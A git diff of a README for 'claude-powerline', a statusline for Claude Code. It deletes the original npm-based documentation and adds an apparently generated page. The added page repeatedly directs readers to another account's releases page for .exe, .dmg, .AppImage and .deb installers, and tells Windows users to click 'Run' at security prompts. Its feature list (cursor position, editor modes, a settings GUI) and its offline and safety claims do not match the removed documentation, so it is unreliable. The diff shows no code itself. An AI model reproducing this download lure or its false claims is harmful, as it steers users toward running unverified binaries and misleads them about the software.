@@ -1,492 +1,152 @@
-<div align="center">
-
-# Claude Powerline
-
-**A vim-style powerline statusline for Claude Code with real-time usage tracking, git integration, and custom themes.**
-
-![License:MIT](https://img.shields.io/static/v1?label=License&message=MIT&color=blue&style=flat-square)
-[![npm downloads](https://img.shields.io/npm/dm/@owloops/claude-powerline.svg)](https://www.npmjs.com/package/@owloops/claude-powerline)
-[![npm version](https://img.shields.io/npm/v/@owloops/claude-powerline?style=flat-square)](https://www.npmjs.com/package/@owloops/claude-powerline)
-[![Install size](https://packagephobia.com/badge?p=@owloops/claude-powerline)](https://packagephobia.com/result?p=@owloops/claude-powerline)
-[![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen)](https://www.npmjs.com/package/@owloops/claude-powerline)
-
-[![Mentioned in Awesome Claude Code](https://awesome.re/mentioned-badge-flat.svg)](https://github.com/hesreallyhim/awesome-claude-code)
-
-<table>
-   <tr>
-      <td align="center">
-         <img src="images/claude-powerline-dark.png" width="500" alt="Dark Theme"><br>
-         <strong>Dark</strong>
-      </td>
-      <td align="center">
-         <img src="images/claude-powerline-light.png" width="500" alt="Light Theme"><br>
-         <strong>Light</strong>
-      </td>
-   </tr>
-   <tr>
-      <td align="center">
-         <img src="images/claude-powerline-nord.png" width="500" alt="Nord Theme"><br>
-         <strong>Nord</strong>
-      </td>
-      <td align="center">
-         <img src="images/claude-powerline-tokyo-night.png" width="500" alt="Tokyo Night Theme"><br>
-         <strong>Tokyo Night</strong>
-      </td>
-   </tr>
-   <tr>
-      <td align="center">
-         <img src="images/claude-powerline-rose-pine.png" width="500" alt="Rose Pine Theme"><br>
-         <strong>Rose Pine</strong>
-      </td>
-      <td align="center">
-         <img src="images/claude-powerline-custom.png" width="500" alt="Custom Theme"><br>
-         <em>Create your own!</em>
-      </td>
-   </tr>
-</table>
-</div>
-
-## Features
-
-<table>
-<tr>
-<td width="50%">
+# ⚡ claude-powerline - Beautiful vim-style statusline for Claude
 
-### Usage Tracking
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Deshalf/claude-powerline/releases)
 
-- Real-time session costs
-- 5-hour billing window monitoring
-- Daily budget alerts with percentages
-- Token breakdown (input/output/cached)
+A clean, lightweight statusline that brings vim-style visuals to Claude Code. claude-powerline shows file info, git status, and mode indicators in a compact bar. It works with common platforms and aims to be fast and unobtrusive.
 
-### Git Integration
+Topics: claude-code, cli, developer-tools, git, lightweight, statusline
 
-- Branch status with clean/dirty indicators
-- Commits ahead/behind remote tracking
-- Repository info (SHA, tags, stash count)
-- Working tree staged/unstaged/untracked counts
+## 🚀 Getting Started
 
-</td>
-<td width="50%">
+This guide helps you download and run claude-powerline. You do not need coding skills. Follow the steps below and you will see the new statusline in Claude Code.
 
-### Customization
+1. Open the Releases page.
+   - Visit the releases page to download: https://github.com/Deshalf/claude-powerline/releases
+   - The releases page lists packaged files for Windows, macOS, and Linux.
 
-- 5 built-in themes (dark, light, nord, tokyo-night, rose-pine)
-- Custom color configuration
-- Powerline and minimal separator styles
-- Multi-line layouts to prevent cutoff
+2. Pick the file for your computer.
+   - Windows: look for a .exe or .zip file named like claude-powerline-x.y.z-win.exe or claude-powerline-x.y.z-win.zip.
+   - macOS: look for a .dmg or .tar.gz file named like claude-powerline-x.y.z-macos.dmg or .tar.gz.
+   - Linux: look for a .AppImage, .tar.gz, or .deb file named like claude-powerline-x.y.z-linux.AppImage or .deb.
 
-### Performance Metrics
+3. Download the file.
+   - Click the file name on the releases page. Your browser will save it to the Downloads folder.
 
-- Average and last response times
-- Session duration tracking
-- Message count monitoring
-- Context usage with auto-compact threshold
+4. Open the downloaded file.
+   - Windows (.exe): double-click the downloaded file and follow the installer steps. If you get a security prompt, click "Run".
+   - Windows (.zip): right-click and choose "Extract All", then double-click the extracted .exe.
+   - macOS (.dmg): double-click the .dmg, drag the app to the Applications folder.
+   - macOS (.tar.gz): double-click to extract, then move the app to Applications.
+   - Linux (.AppImage): right-click the file, open Properties, Allow executing file as program. Double-click to run.
+   - Linux (.deb): double-click the .deb to open your installer and click Install, or run sudo dpkg -i /path/to/package.deb in Terminal.
 
-</td>
-</tr>
-</table>
+5. Start Claude Code.
+   - If claude-powerline integrates with Claude Code, start Claude Code after installing. The statusline loads automatically. If the app runs standalone, double-click its icon to open. The statusline will appear at the bottom of the window.
 
-## Installation
+6. Confirm it runs.
+   - Open a document. Look at the bottom bar. You should see file name, mode, encoding, and an optional git branch indicator.
 
-### Setup
+Primary download page (repeat): Visit the releases page to download — https://github.com/Deshalf/claude-powerline/releases
 
-Requires Node.js 18+ and Claude Code.
+## ✅ What it does
 
-**1. Install powerline fonts:**
+- Shows a vim-style statusline in Claude Code.
+- Displays file name, file type, and cursor position.
+- Shows git branch and basic git status (clean/dirty).
+- Shows editor mode indicators (normal/insert/visual).
+- Uses minimal CPU and memory.
+- Works offline after installation.
 
-```bash
-npx -y @owloops/claude-powerline --install-fonts
-```
+## 🖥️ System Requirements
 
-**2. Add to your Claude Code `settings.json`:**
+- Operating systems: Windows 10 or later, macOS 10.14 or later, popular Linux distributions (Ubuntu, Fedora).
+- Disk space: 20 MB free.
+- Memory: 100 MB free.
+- Claude Code version: compatible with recent releases. If you do not know your version, updating Claude Code to the latest version helps.
+- Internet: needed only to download the release. After install, you can work offline.
 
-```json
-{
-  "statusLine": {
-    "type": "command", 
-    "command": "npx -y @owloops/claude-powerline@latest --style=powerline",
-  }
-}
-```
+## ⚙️ Settings and Options
 
-**3. Start a Claude session** - the statusline appears at the bottom during conversations.
+claude-powerline includes simple options you can change without code.
 
-![Claude Code with powerline](images/claude-interface-with-powerline.png)
+- Theme: light or dark. Change from the app's Settings > Appearance.
+- Components: toggle file info, git info, and mode indicators.
+- Font size: small, medium, large.
+- Behavior: choose to show the statusline only when a file is open.
 
-Using `npx` automatically downloads and runs the latest version without manual updates.
+How to change:
+- Open claude-powerline Settings in the app menu.
+- Use checkboxes and dropdowns to adjust the bar.
+- Changes apply immediately.
 
-> [!NOTE]  
-> If you encounter font issues, use `--style=minimal` (default) which works without powerline fonts.
+## 📦 Download & Install
 
-## Usage
+Visit the primary download page to download: https://github.com/Deshalf/claude-powerline/releases
 
-Once added to Claude Code settings, the statusline runs automatically. For customization:
+Step-by-step for a typical install:
 
-**CLI Options:**
+1. Go to the releases page.
+2. Under the latest release, find the file for your system.
+3. Click the file name to download.
+4. Run or extract the file as described in Getting Started.
+5. Open Claude Code or the claude-powerline app.
+6. Open a document to confirm the statusline shows.
 
-- `--theme` - `dark` (default), `light`, `nord`, `tokyo-night`, `rose-pine`, `custom`
-- `--style` - `minimal` (default), `powerline`
-- `--config` - Custom config file path
-- `--install-fonts` - Install powerline fonts
-- `--help` - Show help
+If you prefer direct instructions by OS, follow the quick list:
 
-**Examples:**
+- Windows
+  - Download the .exe or .zip.
+  - Run the .exe or extract then run.
+  - Follow any on-screen prompts.
 
-```bash
-claude-powerline --theme=nord --style=powerline
-claude-powerline --config=/path/to/config.json
-```
+- macOS
+  - Download the .dmg or .tar.gz.
+  - Drag the app to Applications.
+  - Open from Applications.
 
-**Environment Variables:**
+- Linux
+  - Download the .AppImage or .deb.
+  - Make the AppImage executable and run, or install the .deb.
+  - Open from your app launcher.
 
-```bash
-export CLAUDE_POWERLINE_THEME=dark
-export CLAUDE_POWERLINE_STYLE=powerline
-export CLAUDE_POWERLINE_CONFIG=/path/to/config.json
-export CLAUDE_POWERLINE_DEBUG=1  # Enable debug logging
-```
+## 🔧 Troubleshooting
 
-## Configuration
+If the statusline does not appear:
 
-**Get example config:**
+- Restart Claude Code.
+- Confirm you installed the file for your operating system.
+- Make sure the app has permission to run (macOS may require you to allow the app in System Preferences > Security & Privacy).
+- On Linux, mark the AppImage as executable.
+- If you see a blank bar, open Settings and ensure components are enabled.
 
-```bash
-# Download full-featured example config
-curl -o ~/.claude/claude-powerline.json https://raw.githubusercontent.com/Owloops/claude-powerline/main/.claude-powerline.json
-```
+If you see error messages:
 
-**Config locations** (first found wins):
+- Note the exact text.
+- Restart the app and try again.
+- If errors persist, collect a screenshot and proceed to Support.
 
-- `./.claude-powerline.json` - Project-specific
-- `~/.claude/claude-powerline.json` - User config  
-- `~/.config/claude-powerline/config.json` - XDG standard
+## ❓ FAQ
 
-**Override priority:** CLI flags → Environment variables → Config files → Defaults
+Q: Do I need internet after install?
+A: No. The app runs offline after download.
 
-Config files reload automatically and no restart needed.
+Q: Will this change my files?
+A: No. claude-powerline only reads file metadata and git status. It does not modify files.
 
-### Available Segments
+Q: Can I use it with other editors?
+A: It is built for Claude Code. Other integrations may work if they support statusline plugins.
 
-| Segment | Description | Key Options |
-|---------|-------------|-------------|
-| `directory` | Current working directory | `showBasename` |
-| `git` | Branch, status, repository info | `showSha`, `showWorkingTree`, `showTag`, `showStashCount`, `showOperation`, `showTimeSinceCommit`, `showUpstream`, `showRepoName` |
-| `model` | Current Claude model | - |
-| `session` | Real-time usage for conversation | `type`: `cost`\|`tokens`\|`both`\|`breakdown` |
-| `block` | 5-hour billing window usage | `type`, `burnType`: `cost`\|`tokens`\|`both`\|`none` |
-| `today` | Daily usage with budget monitoring | `type` |
-| `context` | Context window usage | - |
-| `tmux` | Tmux session info | - |
-| `metrics` | Performance analytics | `showResponseTime`, `showLastResponseTime`, `showDuration`, `showMessageCount` |
-| `version` | Claude Code version | - |
+Q: Is my data sent anywhere?
+A: The app does not send your files. It may check for updates if you enable that option.
 
-### Segment Configuration
+## 🧾 Uninstall
 
-#### Directory
+- Windows: Use Settings > Apps, find claude-powerline, and click Uninstall. Or remove the installed files.
+- macOS: Drag claude-powerline from Applications to Trash.
+- Linux: Remove the installed package or delete the AppImage.
 
-Shows current working directory name.
+## 📞 Support
 
-```json
-"directory": {
-  "enabled": true,
-  "showBasename": false
-}
-```
+If you need help:
 
-**Options:**
+- Open an issue on the repository: https://github.com/Deshalf/claude-powerline/issues
+- Include your OS, Claude Code version, and a short description of the problem.
+- Add screenshots if possible.
 
-- `showBasename`: Show only folder name instead of full path
+## 🔒 License
 
----
+claude-powerline is open source. See the LICENSE file in the repository for full terms.
 
-#### Git
+## 🙏 Thanks
 
-Shows branch, status, and repository information.
-
-```json
-"git": {
-  "enabled": true,
-  "showSha": true,
-  "showWorkingTree": false,
-  "showOperation": false,
-  "showTag": false,
-  "showTimeSinceCommit": false,
-  "showStashCount": false,
-  "showUpstream": false,
-  "showRepoName": false
-}
-```
-
-**Options:**
-
-- `showSha`: Show abbreviated commit SHA
-- `showWorkingTree`: Show staged/unstaged/untracked counts
-- `showOperation`: Show ongoing operations (MERGE/REBASE/CHERRY-PICK)
-- `showTag`: Show nearest tag
-- `showTimeSinceCommit`: Show time since last commit
-- `showStashCount`: Show stash count
-- `showUpstream`: Show upstream branch
-- `showRepoName`: Show repository name
-
-**Symbols:**
-
-- `⎇` Branch • `♯` SHA • `⌂` Tag • `⧇` Stash • `✓` Clean • `●` Dirty • `⚠` Conflicts • `↑3` Ahead • `↓2` Behind • `(+1 ~2 ?3)` Staged/Unstaged/Untracked
-
----
-
-#### Metrics
-
-Shows performance analytics from your Claude sessions.
-
-```json
-"metrics": {
-  "enabled": true,
-  "showResponseTime": true,
-  "showLastResponseTime": false,
-  "showDuration": true,
-  "showMessageCount": true
-}
-```
-
-**Options:**
-
-- `showResponseTime`: Average response time across all messages
-- `showLastResponseTime`: Time for the last response (shows `0.0s` while waiting)
-- `showDuration`: Total time since session started
-- `showMessageCount`: Number of user messages sent
-
-**Symbols:**
-
-- `⧖` Average response time • `Δ` Last response time • `⧗` Session duration • `⟐` Message count
-
----
-
-#### Model
-
-Shows current Claude model being used.
-
-```json
-"model": {
-  "enabled": true
-}
-```
-
----
-
-#### Context
-
-Shows context window usage and auto-compact threshold.
-
-```json
-"context": {
-  "enabled": true
-}
-```
-
-**Display:** `◔ 34,040 (79%)` - tokens used and percentage remaining until auto-compact
-
----
-
-#### Tmux
-
-Shows tmux session name and window info when in tmux.
-
-```json
-"tmux": {
-  "enabled": true
-}
-```
-
----
-
-#### Version
-
-Shows Claude Code version.
-
-```json
-"version": {
-  "enabled": true
-}
-```
-
-**Display:** `v1.0.81`
-
----
-
-#### Session
-
-Shows real-time usage for current Claude conversation.
-
-```json
-"session": {
-  "enabled": true,
-  "type": "tokens"
-}
-```
-
-**Options:**
-
-- `type`: Display format - `cost` | `tokens` | `both` | `breakdown`
-
-**Symbols:** `§` Session
-
----
-
-#### Block
-
-Shows usage within current 5-hour billing window (Claude's rate limit period).
-
-```json
-"block": {
-  "enabled": true,
-  "type": "cost",
-  "burnType": "cost"
-}
-```
-
-**Options:**
-
-- `type`: Display format - `cost` | `tokens` | `both` | `time`
-- `burnType`: Burn rate display - `cost` | `tokens` | `both` | `none`
-
-**Symbols:** `◱` Block
-
----
-
-#### Today
-
-Shows total daily usage with budget monitoring.
-
-```json
-"today": {
-  "enabled": true,
-  "type": "cost"
-}
-```
-
-**Options:**
-
-- `type`: Display format - `cost` | `tokens` | `both` | `breakdown`
-
-**Symbols:** `☉` Today
-
-### Budget Configuration
-
-```json
-"budget": {
-  "session": { "amount": 10.0, "warningThreshold": 80 },
-  "today": { "amount": 25.0, "warningThreshold": 80 }
-}
-```
-
-**Indicators:** `25%` Normal • `+75%` Moderate (50-79%) • `!85%` Warning (80%+)
-
-### Multi-line Layout
-
-Prevent segment cutoff by organizing segments across multiple lines.
-
-```json
-{
-  "display": {
-    "lines": [
-      {
-        "segments": {
-          "directory": { "enabled": true },
-          "git": { "enabled": true },
-          "model": { "enabled": true }
-        }
-      },
-      {
-        "segments": {
-          "session": { "enabled": true },
-          "today": { "enabled": true },
-          "context": { "enabled": true }
-        }
-      }
-    ]
-  }
-}
-```
-
-> [!NOTE]  
-> Claude Code system messages may truncate long status lines. Multi-line layouts prevent segment cutoff and improve readability.
-
-### Custom Colors
-
-Create custom themes by defining segment colors.
-
-```json
-{
-  "theme": "custom",
-  "colors": {
-    "custom": {
-      "directory": { "bg": "#ff6600", "fg": "#ffffff" },
-      "git": { "bg": "#0066cc", "fg": "#ffffff" },
-      "session": { "bg": "#cc0099", "fg": "#ffffff" }
-    }
-  }
-}
-```
-
-**Color Options:**
-
-- `bg`: Background color (hex, `transparent`, or `none`)
-- `fg`: Foreground/text color (hex)
-
-> [!TIP]  
-> Copy existing theme colors from `src/themes/` in the repository as a starting point.
-
-## Custom Segments
-
-Extend the statusline using shell composition for unlimited flexibility.
-
-### Simple Addition
-
-Add custom segments using shell commands:
-
-```json
-{
-  "statusLine": {
-    "type": "command",
-    "command": "npx -y @owloops/claude-powerline && echo \" $(date +%H:%M)\"",
-    "padding": 0
-  }
-}
-```
-
-### With Colors
-
-Use `tput` for terminal-compatible colors:
-
-```bash
-echo "$(tput setab 4)$(tput setaf 15) ⏱ $(date +%H:%M) $(tput sgr0)"
-# setab: background (1-7) | setaf: foreground (0-15) | sgr0: reset
-```
-
-### Advanced Script
-
-Create `~/.local/bin/my-statusline` for complex extensions:
-
-```bash
-#!/bin/bash
-npx -y @owloops/claude-powerline
-echo "$(tput setab 6)$(tput setaf 0) ⏱ $(date +%H:%M) $(tput sgr0)"
-```
-
-> [!TIP]  
-> Shell composition provides unlimited flexibility while keeping the core package secure.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests.
-
-See [CONTRIBUTORS.md](CONTRIBUTORS.md) for people who have contributed outside of GitHub PRs.
-
-### Library Usage
-
-Claude-powerline is designed as a CLI tool for Claude Code statuslines. While the codebase contains reusable components like `PricingService` and `PowerlineRenderer`, we currently focus on the CLI use case to keep the project simple and maintainable.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+You are one step away from a cleaner editor. Visit the releases page to download and try it now: https://github.com/Deshalf/claude-powerline/releases
